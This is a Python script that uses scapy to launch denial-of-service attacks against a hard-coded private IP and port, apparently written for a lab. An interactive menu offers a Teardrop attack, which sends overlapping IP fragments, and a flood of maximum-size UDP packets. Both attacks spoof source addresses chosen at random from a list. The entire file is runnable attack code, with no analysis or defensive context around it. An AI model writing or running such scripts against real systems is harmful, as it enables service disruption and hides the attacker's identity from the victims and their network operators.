from scapy.all import *
import random
import threading
import time
from tqdm import tqdm

sent_packets = 0
start_time = 0

sent_packets_lock = threading.Lock()

def send_tear_drop_packet(server_ip, server_port, source_ips, count, progress_bar):
    global sent_packets, start_time
    while sent_packets < count:
        source_ip = random.choice(source_ips)

        # Create overlapping fragments for Tear Drop attack
        frag1 = IP(src=source_ip, dst=server_ip, flags=1, frag=0) / UDP(dport=server_port) / Raw(RandString(size=1480))
        frag2 = IP(src=source_ip, dst=server_ip, flags=1, frag=2) / UDP(dport=server_port) / Raw(RandString(size=1480))

        send(frag1, verbose=0)
        send(frag2, verbose=0)

        with sent_packets_lock:
            sent_packets += 1

        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        time.sleep(1)

def send_max_packet_size(server_ip, server_port, source_ips, count, progress_bar):
    global sent_packets, start_time
    while sent_packets < count:
        source_ip = random.choice(source_ips)

        # Create maximum-sized packet
        max_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / Raw(RandString(size=65507))

        send(max_packet, verbose=0)

        with sent_packets_lock:
            sent_packets += 1

        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        time.sleep(1)

def main():
    global start_time
    attack_choice = input("Choose an attack: \n1. Tear Drop\n2. Maximum Packet Size\nEnter the attack number: ")

    number_of_packets = int(input("Enter the number of times to execute the attack: "))
    server_ip = '192.168.119.130'
    server_port = 12345
    source_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102']

    start_time = time.time()

    with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
        if attack_choice == '1':
            send_tear_drop_packet(server_ip, server_port, source_ips, number_of_packets, progress_bar)
        elif attack_choice == '2':
            send_max_packet_size(server_ip, server_port, source_ips, number_of_packets, progress_bar)
        else:
            print("Invalid choice. Please choose 1 or 2.")

if __name__ == "__main__":
    main()
